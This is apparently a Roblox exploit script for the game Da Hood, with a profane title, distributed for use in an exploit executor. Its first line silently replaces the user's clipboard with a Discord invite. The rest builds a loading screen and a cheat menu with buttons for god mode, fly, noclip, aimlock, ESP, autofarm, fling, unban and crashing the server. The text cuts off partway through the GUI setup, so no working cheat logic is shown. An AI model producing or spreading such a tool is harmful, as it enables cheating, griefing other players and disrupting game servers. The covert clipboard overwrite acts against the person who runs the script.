
setclipboard("https://discord.gg/NWZv2QDZ8W") toclipboard("https://discord.gg/NWZv2QDZ8W")
------------------------------------------------------HAHA

local Loader = Instance.new("ScreenGui")
local Background = Instance.new("Frame")
local UICorner = Instance.new("UICorner")
local t1 = Instance.new("TextLabel")
local t2 = Instance.new("TextLabel")
local SubjectFrame = Instance.new("Frame")
local UICorner_2 = Instance.new("UICorner")
local Subject = Instance.new("TextLabel")
local t3 = Instance.new("TextLabel")

Loader.Name = "Loader"
Loader.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
Loader.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
Loader.DisplayOrder = 10000

Background.Name = "Background"
Background.Parent = Loader
Background.BackgroundColor3 = Color3.fromRGB(1, 0, 0)
Background.BorderSizePixel = 3
Background.ClipsDescendants = true
Background.Position = UDim2.new(0.499000013, 0, 0.353784859, 0)
Background.Size = UDim2.new(0, 0, 0.288844615, 0)

UICorner.Parent = Background

t1.Name = "t1"
t1.Parent = Background
t1.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
t1.BackgroundTransparency = 1.000
t1.BorderSizePixel = 0
t1.Position = UDim2.new(0.0808080807, 0, 0.110344827, 0)
t1.Size = UDim2.new(0.835016727, 0, 0.296551734, 0)
t1.Font = Enum.Font.GothamBlack
t1.Text = "UserX Dahood Fucker"
t1.TextColor3 = Color3.fromRGB(223, 0, 0)
t1.TextScaled = true
t1.TextSize = 14.000
t1.TextTransparency = 1.000
t1.TextWrapped = true

t2.Name = "t2"
t2.Parent = Background
t2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
t2.BackgroundTransparency = 1.000
t2.BorderSizePixel = 0
t2.Position = UDim2.new(0.0808080807, 0, 0.351724148, 0)
t2.Size = UDim2.new(0.835016727, 0, 0.137931034, 0)
t2.Font = Enum.Font.SourceSansLight
t2.Text = "by Userx63"
t2.TextColor3 = Color3.fromRGB(223, 230, 233)
t2.TextScaled = true
t2.TextSize = 14.000
t2.TextTransparency = 1.000
t2.TextWrapped = true

SubjectFrame.Name = "SubjectFrame"
SubjectFrame.Parent = Background
SubjectFrame.BackgroundColor3 = Color3.fromRGB(99, 110, 114)
SubjectFrame.BorderSizePixel = 0
SubjectFrame.Position = UDim2.new(0.0419999994, 0, 1, 0)
SubjectFrame.Size = UDim2.new(0.923149765, 0, 0.275065273, 0)

UICorner_2.Parent = SubjectFrame

local SUBJECT = "Dahood Fucker Version 1.2"
Subject.Name = "Subject"
Subject.Parent = SubjectFrame
Subject.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
Subject.BackgroundTransparency = 1.000
Subject.BorderSizePixel = 0
Subject.Position = UDim2.new(0.0420838557, 0, 0.0752172545, 0)
Subject.Size = UDim2.new(0.904530346, 0, 0.849565387, 0)
Subject.Font = Enum.Font.SourceSansBold
Subject.Text = SUBJECT
Subject.TextColor3 = Color3.fromRGB(223, 230, 233)
Subject.TextScaled = true
Subject.TextSize = 14.000
Subject.TextWrapped = true

t3.Name = "t3"
t3.Parent = Background
t3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
t3.BackgroundTransparency = 1.000
t3.BorderSizePixel = 0
t3.Position = UDim2.new(0.434343427, 0, 0.845555723, 0)
t3.Size = UDim2.new(0.134680107, 0, 0.154444426, 0)
t3.Font = Enum.Font.ArialBold
t3.Text = "Loading."
t3.TextColor3 = Color3.fromRGB(223, 230, 233)
t3.TextScaled = true
t3.TextSize = 14.000
t3.TextTransparency = 1.000
t3.TextWrapped = true

local function DZNO_fake_script()
	local script = Instance.new('LocalScript', t3)

	while true do
		wait(0.5)
		script.Parent.Text = "Loading."
		wait(0.5)
		script.Parent.Text = "Loading.."
	end
end
coroutine.wrap(DZNO_fake_script)()

local function GLEDHUR_fake_script()
	local script = Instance.new('LocalScript', Loader)

	local BG = script.Parent.Background
	local SF = script.Parent.Background.SubjectFrame
	
	wait(2)
	BG:TweenSizeAndPosition(UDim2.new(0.362, 0, 0.289, 0), UDim2.new(0.319, 0, 0.355, 0), 'Out', 'Quint', 2)
	wait(2)
	local Info = TweenInfo.new(0.5)
	local Tween = game:GetService("TweenService"):Create(BG.t1,Info,{TextTransparency=0})
	local Tween2 = game:GetService("TweenService"):Create(BG.t2,Info,{TextTransparency=0})
	local Tween3 = game:GetService("TweenService"):Create(BG.t3,Info,{TextTransparency=0})
	Tween:Play()
	Tween2:Play()
	wait(1.5)
	SF:TweenPosition(UDim2.new(0.042, 0, 0.57, 0), 'Out', 'Quad', 0.5)
	wait(1)
	Tween3:Play()
	local loadwait = math.random(2,4)
	wait(loadwait)
	BG.t3.LocalScript:Destroy()
	wait(0.1)
	BG.t3.Text = "Creating Gui..."
	
	wait(1)
	BG.t3.Text = "Ready!"
	wait(1.5)
	BG:TweenPosition(UDim2.new(0.319, 0, -0.4, 0), 'InOut', 'Quad', 1.5)
	wait(2)
	Loader.Visible = false
end
coroutine.wrap(GLEDHUR_fake_script)()
wait(10)
wait(0.2)
game.StarterGui:SetCore("SendNotification", {
Title = "KEY"; -- the title 
Text = "Keystystem deactivated for now."; -- what the text says 
Duration = 5; -- how long the notification should in secounds
})
wait(4)
game:GetService("StarterGui"):SetCore("SendNotification", { 

	Title = "Loaded";

	Text = "Starting...";

	Icon = "rbxthumb://type=Asset&id=5107182114&w=150&h=150"})

Duration = 16;
-- Scripts:

local Swagmode = Instance.new("ScreenGui")
local SwagmodeFrame = Instance.new("Frame")
local MenuFrame = Instance.new("Frame")
local TogglesButton = Instance.new("TextButton")
local QuickTpButton = Instance.new("TextButton")
local SideButton = Instance.new("TextButton")
local imiecredits = Instance.new("TextLabel")
local Swagmode_2 = Instance.new("TextLabel")
local UIGradient = Instance.new("UIGradient")
local Frame = Instance.new("Frame")
local MainButton = Instance.new("TextButton")
local SellingButton = Instance.new("TextButton")
local DropShadowHolder = Instance.new("Frame")
local DropShadow = Instance.new("ImageLabel")
local TopLine = Instance.new("Frame")
local SideInfo = Instance.new("Frame")
local TargetImage = Instance.new("ImageLabel")
local UICorner = Instance.new("UICorner")
local SetNearestButton = Instance.new("TextButton")
local CashLabel = Instance.new("TextLabel")
local TargetTextbox = Instance.new("TextBox")
local BountyLabel = Instance.new("TextLabel")
local CrewLabel = Instance.new("TextButton")
local Buttons = Instance.new("Frame")
local MainFrame = Instance.new("Frame")
local FreeFists = Instance.new("TextButton")
local GodBlock = Instance.new("TextButton")
local GodArmor = Instance.new("TextButton")
local FlySpeedMinus = Instance.new("TextButton")
local Fly = Instance.new("TextButton")
local Fling = Instance.new("TextButton")
local NoRecoil = Instance.new("TextButton")
local GoTo = Instance.new("TextButton")
local View = Instance.new("TextButton")
local Target = Instance.new("TextButton")
local FlySpeedPlus = Instance.new("TextButton")
local NoClip = Instance.new("TextButton")
local FlyMode = Instance.new("TextButton")
local Reach = Instance.new("TextButton")
local Headless = Instance.new("TextButton")
local QuickTpFrame = Instance.new("Frame")
local GunShop2 = Instance.new("TextButton")
local PrevPosition = Instance.new("TextButton")
local Bank = Instance.new("TextButton")
local SafeZone1 = Instance.new("TextButton")
local SetSpawn = Instance.new("TextButton")
local Sewer = Instance.new("TextButton")
local Playground = Instance.new("TextButton")
local GasStation = Instance.new("TextButton")
local LavaBase = Instance.new("TextButton")
local SavePos = Instance.new("TextButton")
local SafeZone2 = Instance.new("TextButton")
local UFO = Instance.new("TextButton")
local TacoShop = Instance.new("TextButton")
local LoadPos = Instance.new("TextButton")
local GunShop1 = Instance.new("TextButton")
local SideScriptsFrame = Instance.new("Frame")
local Aimlock = Instance.new("TextButton")
local Users = Instance.new("TextButton")
local MoneyESP = Instance.new("TextButton")
local FullGod = Instance.new("TextButton")
local Autofarm = Instance.new("TextButton")
local HighTool = Instance.new("TextButton")
local Esp = Instance.new("TextButton")
local LastingBullets = Instance.new("TextButton")
local GrenadeLock = Instance.new("TextButton")
local Spin = Instance.new("TextButton")
local Unban = Instance.new("TextButton")
local TaserLock = Instance.new("TextButton")
local RpgLock = Instance.new("TextButton")
local Invisible = Instance.new("TextButton")
local InfTools = Instance.new("TextButton")
local TogglesFrame = Instance.new("Frame")
local QToTp = Instance.new("TextButton")
local QToTpColor = Instance.new("TextLabel")
local HideBlock = Instance.new("TextButton")
local HideBlockColor = Instance.new("TextLabel")
local HideUser = Instance.new("TextButton")
local HideUserColor = Instance.new("TextLabel")
local AutoStomp = Instance.new("TextButton")
local AutoStompColor = Instance.new("TextLabel")
local RocketRide = Instance.new("TextButton")
local RocketRideColor = Instance.new("TextLabel")
local AntiArrest = Instance.new("TextButton")
local AntiArrestColor = Instance.new("TextLabel")
local AntiGrab = Instance.new("TextButton")
local AntiGrabColor = Instance.new("TextLabel")
local AutoDrop = Instance.new("TextButton")
local AutoDropColor = Instance.new("TextLabel")
local AntiStomp = Instance.new("TextButton")
local AntiStompColor = Instance.new("TextLabel")
local AutoBlock = Instance.new("TextButton")
local AutoBlockColor = Instance.new("TextLabel")
local CashAura = Instance.new("TextButton")
local CashAuraColor = Instance.new("TextLabel")
local AntiEffects = Instance.new("TextButton")
local AntiEffectsColor = Instance.new("TextLabel")
local AltArmor = Instance.new("TextButton")
local AltArmorColor = Instance.new("TextLabel")
local AntiBag = Instance.new("TextButton")
local AntiBagColor = Instance.new("TextLabel")
local AntiSlow = Instance.new("TextButton")
local AntiSlowColor = Instance.new("TextLabel")
local SellingFrame = Instance.new("Frame")
local CashTextbox = Instance.new("TextBox")
local CashDropperTitle = Instance.new("TextLabel")
local CalculateButton = Instance.new("TextButton")
local DropToggleButton = Instance.new("TextButton")
local CashDroppedLabel = Instance.new("TextLabel")
local CashAtEndLabel = Instance.new("TextLabel")
local Frame_2 = Instance.new("Frame")
local CrashServerButton = Instance.new("TextButton")

--Properties:
Swagmode.Name = "Swagmode"
Swagmode.Parent = game.CoreGui
Swagmode.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

SwagmodeFrame.Name = "SwagmodeFrame"
SwagmodeFrame.Parent = Swagmode
SwagmodeFrame.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
SwagmodeFrame.BorderSizePixel = 0
SwagmodeFrame.Position = UDim2.new(0.212884605, 0, 0.190036908, 0)
SwagmodeFrame.Size = UDim2.new(0, 605, 0, 336)

MenuFrame.Name = "MenuFrame"
MenuFrame.Parent = SwagmodeFrame
MenuFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
MenuFrame.BorderSizePixel = 0
MenuFrame.Size = UDim2.new(0, 155, 0, 336)

TogglesButton.Name = "TogglesButton"
TogglesButton.Parent = MenuFrame
TogglesButton.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
TogglesButton.BorderSizePixel = 0
TogglesButton.Position = UDim2.new(0.0922105312, 0, 0.440625668, 0)
TogglesButton.Size = UDim2.new(0, 123, 0, 31)
TogglesButton.AutoButtonColor = false
TogglesButton.Font = Enum.Font.GothamBlack
TogglesButton.Text = "Toggles"
TogglesButton.TextColor3 = Color3.fromRGB(255, 255, 255)
TogglesButton.TextSize = 14.000

QuickTpButton.Name = "QuickTpButton"
QuickTpButton.Parent = MenuFrame
QuickTpButton.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
QuickTpButton.BorderSizePixel = 0
QuickTpButton.Position = UDim2.new(0.0922105312, 0, 0.573581994, 0)
QuickTpButton.Size = UDim2.new(0, 123, 0, 31)
QuickTpButton.AutoButtonColor = false
QuickTpButton.Font = Enum.Font.GothamBlack
QuickTpButton.Text = "Quick TP"
QuickTpButton.TextColor3 = Color3.fromRGB(255, 255, 255)
QuickTpButton.TextSize = 14.000

SideButton.Name = "SideButton"
SideButton.Parent = MenuFrame
SideButton.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
SideButton.BorderSizePixel = 0
SideButton.Position = UDim2.new(0.0922105312, 0, 0.307098716, 0)
SideButton.Size = UDim2.new(0, 123, 0, 31)
SideButton.AutoButtonColor = false
SideButton.Font = Enum.Font.GothamBlack
SideButton.Text = "Side Scripts"
SideButton.TextColor3 = Color3.fromRGB(255, 255, 255)
SideButton.TextSize = 14.000
--[[
imiecredits.Name = "imiecredits"
imiecredits.Parent = MenuFrame
imiecredits.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
imiecredits.BackgroundTransparency = 1.000
imiecredits.BorderSizePixel = 0
imiecredits.Position = UDim2.new(0.0507245474, 0, 0.854166687, 0)
imiecredits.Size = UDim2.new(0, 137, 0, 48)
imiecredits.Font = Enum.Font.GothamBold
imiecredits.Text = "Creds!"
imiecredits.TextColor3 = Color3.fromRGB(255, 255, 255)
imiecredits.TextSize = 14.000
--]]
Swagmode_2.Name = "Swagmode"
Swagmode_2.Parent = MenuFrame
Swagmode_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Swagmode_2.BackgroundTransparency = 1.000
Swagmode_2.Position = UDim2.new(0.045161292, 0, 0, 0)
Swagmode_2.Size = UDim2.new(0, 115, 0, 34)
Swagmode_2.Font = Enum.Font.GothamBlack
Swagmode_2.Text = "DH FUCKER"
Swagmode_2.TextColor3 = Color3.fromRGB(255, 0, 0)
Swagmode_2.TextSize = 15.000

UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(49, 48, 70)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 255, 255))}
UIGradient.Offset = Vector2.new(0.100000001, 0)
UIGradient.Parent = Swagmode_2

Frame.Parent = MenuFrame
Frame.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
Frame.BorderSizePixel = 0
Frame.Position = UDim2.new(0.045161292, 0, 0.092261903, 0)
Frame.Size = UDim2.new(0, 126, 0, 3)

MainButton.Name = "MainButton"
MainButton.Parent = MenuFrame
MainButton.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
MainButton.BorderSizePixel = 0
MainButton.Position = UDim2.new(0.0922105238, 0, 0.178689778, 0)
MainButton.Size = UDim2.new(0, 123, 0, 31)
MainButton.AutoButtonColor = false
MainButton.Font = Enum.Font.GothamBlack
MainButton.Text = "Main Scripts"
MainButton.TextColor3 = Color3.fromRGB(255, 255, 255)
MainButton.TextSize = 14.000

SellingButton.Name = "SellingButton"
SellingButton.Parent = MenuFrame
SellingButton.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
SellingButton.BorderSizePixel = 0
SellingButton.Position = UDim2.new(0.0986621454, 0, 0.716439128, 0)
SellingButton.Size = UDim2.new(0, 123, 0, 31)
SellingButton.AutoButtonColor = false
SellingButton.Font = Enum.Font.GothamBlack
SellingButton.Text = "Selling Tools"
SellingButton.TextColor3 = Color3.fromRGB(255, 255, 255)
SellingButton.TextSize = 14.000

DropShadowHolder.Name = "DropShadowHolder"
DropShadowHolder.Parent = SwagmodeFrame
DropShadowHolder.BackgroundTransparency = 1.000
DropShadowHolder.BorderSizePixel = 0
DropShadowHolder.Size = UDim2.new(1, 0, 1, 0)
DropShadowHolder.ZIndex = 0

DropShadow.Name = "DropShadow"
DropShadow.Parent = DropShadowHolder
DropShadow.AnchorPoint = Vector2.new(0.5, 0.5)
DropShadow.BackgroundTransparency = 1.000
DropShadow.BorderSizePixel = 0
DropShadow.Position = UDim2.new(0.5, 0, 0.5, 0)
DropShadow.Size = UDim2.new(1, 47, 1, 47)
DropShadow.ZIndex = 0
DropShadow.Image = "rbxassetid://6015897843"
DropShadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
DropShadow.ImageTransparency = 0.200
DropShadow.ScaleType = Enum.ScaleType.Slice
DropShadow.SliceCenter = Rect.new(49, 49, 450, 450)

TopLine.Name = "TopLine"
TopLine.Parent = SwagmodeFrame
TopLine.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
TopLine.BorderSizePixel = 0
TopLine.Position = UDim2.new(0.256198347, 0, 0, 0)
TopLine.Size = UDim2.new(0, 450, 0, 7)

SideInfo.Name = "SideInfo"
SideInfo.Parent = SwagmodeFrame
SideInfo.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
SideInfo.BorderSizePixel = 0
SideInfo.Position = UDim2.new(0.778512418, 0, 0.020833334, 0)
SideInfo.Size = UDim2.new(0, 134, 0, 329)

TargetImage.Name = "TargetImage"
TargetImage.Parent = SideInfo
TargetImage.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
TargetImage.Position = UDim2.new(0.0950299203, 0, 0.0244709235, 0)
TargetImage.Size = UDim2.new(0, 108, 0, 104)
TargetImage.Image = "rbxasset://textures/ui/GuiImagePlaceholder.png"
TargetImage.ImageColor3 = Color3.fromRGB(300, 300, 300)

UICorner.CornerRadius = UDim.new(0, 500)
UICorner.Parent = TargetImage

SetNearestButton.Name = "SetNearestButton"
SetNearestButton.Parent = SideInfo
SetNearestButton.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
SetNearestButton.BorderSizePixel = 0
SetNearestButton.Position = UDim2.new(0.072641857, 0, 0.851063848, 0)
SetNearestButton.Size = UDim2.new(0, 114, 0, 29)
SetNearestButton.AutoButtonColor = false
SetNearestButton.Font = Enum.Font.GothamBlack
SetNearestButton.Text = "Set Nearest"
SetNearestButton.TextColor3 = Color3.fromRGB(255, 255, 255)
SetNearestButton.TextSize = 14.000

CashLabel.Name = "CashLabel"
CashLabel.Parent = SideInfo
CashLabel.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
CashLabel.BorderSizePixel = 0
CashLabel.Position = UDim2.new(0.072641857, 0, 0.519756854, 0)
CashLabel.Size = UDim2.new(0, 115, 0, 26)
CashLabel.Font = Enum.Font.SourceSans
CashLabel.Text = "Cash:"
CashLabel.TextColor3 = Color3.fromRGB(72, 72, 72)
CashLabel.TextSize = 14.000

TargetTextbox.Name = "TargetTextbox"
TargetTextbox.Parent = SideInfo
TargetTextbox.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
TargetTextbox.BorderSizePixel = 0
TargetTextbox.Position = UDim2.new(0.072641857, 0, 0.392097205, 0)
TargetTextbox.Size = UDim2.new(0, 115, 0, 31)
TargetTextbox.Font = Enum.Font.GothamBlack
TargetTextbox.PlaceholderColor3 = Color3.fromRGB(255, 255, 255)
TargetTextbox.Text = "Name"
TargetTextbox.TextColor3 = Color3.fromRGB(255, 255, 255)
TargetTextbox.TextSize = 14.000
TargetTextbox.TextWrapped = true
TargetTextbox.TextScaled = true

BountyLabel.Name = "BountyLabel"
BountyLabel.Parent = SideInfo
BountyLabel.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
BountyLabel.BorderSizePixel = 0
BountyLabel.Position = UDim2.new(0.072641857, 0, 0.633550763, 0)
BountyLabel.Size = UDim2.new(0, 115, 0, 26)
BountyLabel.Font = Enum.Font.SourceSans
BountyLabel.Text = "Bounty:"
BountyLabel.TextColor3 = Color3.fromRGB(72, 72, 72)
BountyLabel.TextSize = 14.000

CrewLabel.Name = "CrewLabel"
CrewLabel.Parent = SideInfo
CrewLabel.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
CrewLabel.BorderSizePixel = 0
CrewLabel.Position = UDim2.new(0.072641857, 0, 0.737304032, 0)
CrewLabel.Size = UDim2.new(0, 115, 0, 26)
CrewLabel.Font = Enum.Font.SourceSans
CrewLabel.Text = "Crew:"
CrewLabel.TextColor3 = Color3.fromRGB(72, 72, 72)
CrewLabel.TextSize = 14.000
CrewLabel.TextScaled = true

Buttons.Name = "Buttons"
Buttons.Parent = SwagmodeFrame
Buttons.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Buttons.BackgroundTransparency = 1.000
Buttons.Position = UDim2.new(0.256198347, 0, 0.0297619049, 0)
Buttons.Size = UDim2.new(0, 316, 0, 325)

MainFrame.Name = "MainFrame"
MainFrame.Parent = Buttons
MainFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MainFrame.BackgroundTransparency = 1.000
MainFrame.Size = UDim2.new(0, 316, 0, 325)
MainFrame.Visible = true

FreeFists.Name = "FreeFists"
FreeFists.Parent = MainFrame
FreeFists.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
FreeFists.BorderSizePixel = 0
FreeFists.Position = UDim2.new(0.0218890235, 0, 0.590557039, 0)
FreeFists.Size = UDim2.new(0, 94, 0, 46)
FreeFists.Font = Enum.Font.GothamBlack
FreeFists.Text = "FreeFists(T)"
FreeFists.TextColor3 = Color3.fromRGB(255, 255, 255)
FreeFists.TextSize = 14.000

GodBlock.Name = "GodBlock"
GodBlock.Parent = MainFrame
GodBlock.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
GodBlock.BorderSizePixel = 0
GodBlock.Position = UDim2.new(0.0251458082, 0, 0.0399999991, 0)
GodBlock.Size = UDim2.new(0, 94, 0, 46)
GodBlock.Font = Enum.Font.GothamBlack
GodBlock.Text = "GodBlock"
GodBlock.TextColor3 = Color3.fromRGB(255, 255, 255)
GodBlock.TextSize = 14.000

GodArmor.Name = "GodArmor"
GodArmor.Parent = MainFrame
GodArmor.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
GodArmor.BorderSizePixel = 0
GodArmor.Position = UDim2.new(0.024917312, 0, 0.221326202, 0)
GodArmor.Size = UDim2.new(0, 94, 0, 46)
GodArmor.Font = Enum.Font.GothamBlack
GodArmor.Text = "GodArmor"
GodArmor.TextColor3 = Color3.fromRGB(255, 255, 255)
GodArmor.TextSize = 14.000

FlySpeedMinus.Name = "FlySpeedMinus"
FlySpeedMinus.Parent = MainFrame
FlySpeedMinus.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
FlySpeedMinus.BorderSizePixel = 0
FlySpeedMinus.Position = UDim2.new(0.0218890235, 0, 0.762864709, 0)
FlySpeedMinus.Size = UDim2.new(0, 94, 0, 46)
FlySpeedMinus.Font = Enum.Font.GothamBlack
FlySpeedMinus.Text = "FlySpeed -"
FlySpeedMinus.TextColor3 = Color3.fromRGB(255, 255, 255)
FlySpeedMinus.TextSize = 14.000

Fly.Name = "Fly"
Fly.Parent = MainFrame
Fly.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
Fly.BorderSizePixel = 0
Fly.Position = UDim2.new(0.351977378, 0, 0.762864709, 0)
Fly.Size = UDim2.new(0, 94, 0, 46)
Fly.Font = Enum.Font.GothamBlack
Fly.Text = "Fly(X)"
Fly.TextColor3 = Color3.fromRGB(255, 255, 255)
Fly.TextSize = 14.000

Fling.Name = "Fling"
Fling.Parent = MainFrame
Fling.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
Fling.BorderSizePixel = 0
Fling.Position = UDim2.new(0.352205783, 0, 0.409230769, 0)
Fling.Size = UDim2.new(0, 94, 0, 46)
Fling.Font = Enum.Font.GothamBlack
Fling.Text = "Fling"
Fling.TextColor3 = Color3.fromRGB(255, 255, 255)
Fling.TextSize = 14.000

NoRecoil.Name = "NoRecoil"
NoRecoil.Parent = MainFrame
NoRecoil.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
NoRecoil.BorderSizePixel = 0
NoRecoil.Position = UDim2.new(0.355005682, 0, 0.221326202, 0)
NoRecoil.Size = UDim2.new(0, 94, 0, 46)
NoRecoil.Font = Enum.Font.GothamBlack
NoRecoil.Text = "NoRecoil"
NoRecoil.TextColor3 = Color3.fromRGB(255, 255, 255)
NoRecoil.TextSize = 14.000

GoTo.Name = "GoTo"
GoTo.Parent = MainFrame
GoTo.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
GoTo.BorderSizePixel = 0
GoTo.Position = UDim2.new(0.678155124, 0, 0.409230769, 0)
GoTo.Size = UDim2.new(0, 94, 0, 46)
GoTo.Font = Enum.Font.GothamBlack
GoTo.Text = "GoTo"
GoTo.TextColor3 = Color3.fromRGB(255, 255, 255)
GoTo.TextSize = 14.000

View.Name = "View"
View.Parent = MainFrame
View.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
View.BorderSizePixel = 0
View.Position = UDim2.new(0.680955052, 0, 0.221326202, 0)
View.Size = UDim2.new(0, 94, 0, 46)
View.Font = Enum.Font.GothamBlack
View.Text = "View"
View.TextColor3 = Color3.fromRGB(255, 255, 255)
View.TextSize = 14.000

Target.Name = "Target"
Target.Parent = MainFrame
Target.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
Target.BorderSizePixel = 0
Target.Position = UDim2.new(0.681183517, 0, 0.0399999991, 0)
Target.Size = UDim2.new(0, 94, 0, 46)
Target.Font = Enum.Font.GothamBlack
Target.Text = "Target"
Target.TextColor3 = Color3.fromRGB(255, 255, 255)
Target.TextSize = 14.000

FlySpeedPlus.Name = "FlySpeedPlus"
FlySpeedPlus.Parent = MainFrame
FlySpeedPlus.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
FlySpeedPlus.BorderSizePixel = 0
FlySpeedPlus.Position = UDim2.new(0.677926719, 0, 0.762864709, 0)
FlySpeedPlus.Size = UDim2.new(0, 94, 0, 46)
FlySpeedPlus.Font = Enum.Font.GothamBlack
FlySpeedPlus.Text = "FlySpeed +"
FlySpeedPlus.TextColor3 = Color3.fromRGB(255, 255, 255)
FlySpeedPlus.TextSize = 14.000

NoClip.Name = "NoClip"
NoClip.Parent = MainFrame
NoClip.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
NoClip.BorderSizePixel = 0
NoClip.Position = UDim2.new(0.677926719, 0, 0.590557039, 0)
NoClip.Size = UDim2.new(0, 94, 0, 46)
NoClip.Font = Enum.Font.GothamBlack
NoClip.Text = "NoClip(Z)"
NoClip.TextColor3 = Color3.fromRGB(255, 255, 255)
NoClip.TextSize = 14.000

FlyMode.Name = "FlyMode"
FlyMode.Parent = MainFrame
FlyMode.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
FlyMode.BorderSizePixel = 0
FlyMode.Position = UDim2.new(0.351977378, 0, 0.590557039, 0)
FlyMode.Size = UDim2.new(0, 94, 0, 46)
FlyMode.Font = Enum.Font.GothamBlack
FlyMode.Text = "FlyMode"
FlyMode.TextColor3 = Color3.fromRGB(255, 255, 255)
FlyMode.TextSize = 14.000

Reach.Name = "Reach"
Reach.Parent = MainFrame
Reach.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
Reach.BorderSizePixel = 0
Reach.Position = UDim2.new(0.355234176, 0, 0.0399999991, 0)
Reach.Size = UDim2.new(0, 94, 0, 46)
Reach.Font = Enum.Font.GothamBlack
Reach.Text = "Reach"
Reach.TextColor3 = Color3.fromRGB(255, 255, 255)
Reach.TextSize = 14.000

Headless.Name = "Headless"
Headless.Parent = MainFrame
Headless.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
Headless.BorderSizePixel = 0
Headless.Position = UDim2.new(0.0221175179, 0, 0.409230769, 0)
Headless.Size = UDim2.new(0, 94, 0, 46)
Headless.Font = Enum.Font.GothamBlack
Headless.Text = "Headless"
Headless.TextColor3 = Color3.fromRGB(255, 255, 255)
Headless.TextSize = 14.000

QuickTpFrame.Name = "QuickTpFrame"
QuickTpFrame.Parent = Buttons
QuickTpFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
QuickTpFrame.BackgroundTransparency = 1.000
QuickTpFrame.Size = UDim2.new(0, 316, 0, 325)
QuickTpFrame.Visible = false

GunShop2.Name = "GunShop2"
GunShop2.Parent = QuickTpFrame
GunShop2.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
GunShop2.BorderSizePixel = 0
GunShop2.Position = UDim2.new(0.0218890235, 0, 0.590557039, 0)
GunShop2.Size = UDim2.new(0, 94, 0, 46)
GunShop2.Font = Enum.Font.GothamBlack
GunShop2.Text = "GunShop(UP)"
GunShop2.TextColor3 = Color3.fromRGB(255, 255, 255)
GunShop2.TextSize = 14.000

PrevPosition.Name = "PrevPosition"
PrevPosition.Parent = QuickTpFrame
PrevPosition.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
PrevPosition.BorderSizePixel = 0
PrevPosition.Position = UDim2.new(0.0251458082, 0, 0.0399999991, 0)
PrevPosition.Size = UDim2.new(0, 94, 0, 46)
PrevPosition.Font = Enum.Font.GothamBlack
PrevPosition.Text = "PrevPos"
PrevPosition.TextColor3 = Color3.fromRGB(255, 255, 255)
PrevPosition.TextSize = 14.000

Bank.Name = "Bank"
Bank.Parent = QuickTpFrame
Bank.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
Bank.BorderSizePixel = 0
Bank.Position = UDim2.new(0.024917312, 0, 0.221326202, 0)
Bank.Size = UDim2.new(0, 94, 0, 46)
Bank.Font = Enum.Font.GothamBlack
Bank.Text = "Bank"
Bank.TextColor3 = Color3.fromRGB(255, 255, 255)
Bank.TextSize = 14.000

SafeZone1.Name = "SafeZone1"
SafeZone1.Parent = QuickTpFrame
SafeZone1.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
SafeZone1.BorderSizePixel = 0
SafeZone1.Position = UDim2.new(0.0218890235, 0, 0.762864709, 0)
SafeZone1.Size = UDim2.new(0, 94, 0, 46)
SafeZone1.Font = Enum.Font.GothamBlack
SafeZone1.Text = "Safe Zone #1"
SafeZone1.TextColor3 = Color3.fromRGB(255, 255, 255)
SafeZone1.TextSize = 14.000

SetSpawn.Name = "SetSpawn"
SetSpawn.Parent = QuickTpFrame
SetSpawn.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
SetSpawn.BorderSizePixel = 0
SetSpawn.Position = UDim2.new(0.351977378, 0, 0.762864709, 0)
SetSpawn.Size = UDim2.new(0, 94, 0, 46)
SetSpawn.Font = Enum.Font.GothamBlack
SetSpawn.Text = "SetSpawn"
SetSpawn.TextColor3 = Color3.fromRGB(255, 255, 255)
SetSpawn.TextSize = 14.000

Sewer.Name = "Sewer"
Sewer.Parent = QuickTpFrame
Sewer.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
Sewer.BorderSizePixel = 0
Sewer.Position = UDim2.new(0.352205783, 0, 0.409230769, 0)
